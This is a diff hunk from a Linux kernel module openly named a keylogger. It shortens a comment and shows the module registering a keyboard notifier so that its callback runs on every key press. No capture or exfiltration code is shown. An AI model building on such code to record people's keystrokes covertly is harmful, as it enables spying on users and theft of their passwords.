@@ -85,9 +85,8 @@ static struct notifier_block keylogger_nb =
 
 static int __init init_keylogger(void)
 {
-    /* Register this module with the notification list maintained by the keyboard driver.
-    This will cause our "keylogger_notify" function to be called upon every key press and release event. This call is non-blocking.
-    */
+    // Register this module with the notification list maintained by the keyboard driver.
+    
     register_keyboard_notifier(&keylogger_nb);
     printk(KERN_INFO "Registering the keylogger module with the keyboard notifier list\n");
     sema_init(&sem, 1);
